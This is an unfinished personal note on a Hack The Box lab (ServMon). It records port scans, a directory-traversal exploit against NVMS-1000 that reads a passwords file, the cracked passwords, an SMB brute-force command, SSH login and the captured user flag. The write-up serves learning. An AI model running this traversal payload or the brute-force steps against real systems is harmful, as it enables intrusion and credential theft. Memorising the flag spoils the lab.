
- [ ] Default Creds  
- [ ] Source Code
- [ ] Known Vuln
- [ ] BruteForce



# IP:  10.129.227.77




# Port Scanning


```powershell

nmap -sC -sV -oA nmap/ServMon 10.129.227.77

# Results:

Port 21 FTP: Allowed FTP access. 
```



# Port 80 - Webserver



![[Pasted image 20251212135100.png]]



```powershell
NVMS-1000

```


# Attempts

```powershell

# Default Password found on internent
admin : 123456 # didn't work.  -c 

# let's run directory discover
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ
# All pages return 200 :(

```

# Search for known vuln:

![[Pasted image 20251212142212.png]]


# Test the known vuln 47774:

**`IT WORKS!!!`**

![[Pasted image 20251212142353.png]]


# Fixing the Exploit:

```powershell

# Since we know from public access to FTP that there's a Passwords.txt on Nathan's Desktop, we can change the requset to get it

GET /../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt 


# Found Passwords: 
1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$

# We cam now create a custom username list and try to bruteforce with the above passwords. 
```

![[Pasted image 20251212142536.png]]



# Check FTP Port 21:


![[Pasted image 20251212140244.png]]


 - It is possible to login anonymously
 - Found two user Directory folders: Nadine, Nathan
 - Exploring `Confidential.txt` in `Nadine's` folder:

```powershell
ftp> !cat Confidential.txt
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

```


- Exploring Nathan's folder - There's a `Notes to do.txt`

```powershell

ftp> !cat "Notes to do.txt"

1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint
   
   
```


can't find anything else for now. Let's move on. 




# Check  SMB


![[Pasted image 20251212140259.png]]



enum4linux-ng HTB | tee enum4linux-ng.log

![[Pasted image 20251212140413.png]]


Bruteforcing using the known username/passwords:


```powershell
# command
nxc smb ip.txt -u users.txt -p passwords.txt --continue-on-success 
```


![[Pasted image 20251212144444.png]]

Found the creds:

> Nadine : L1k3B1gBut7s@W0rk


Seems like anonymous access can't be done. 



#### Authenticated SMBMAP


![[Pasted image 20251212145335.png]]



# SSH

Connect to the machine using: `Nadine:L1k3B1gBut7s@W0rk` 

![[Pasted image 20251212161358.png]]

User.flag:

> 62e8424d6caeecfe4b1b873e3004f7f3
# PrivEsc 

# Custom


- Create a userlist:
	- 


# Lessons Learned:


1. Spend some time on the intial nmap reseult and make sure to have a footprint of all the services. 

	Not sure why I was bruteforcing SMB when we have port SSH open 🤷‍♂️

2. 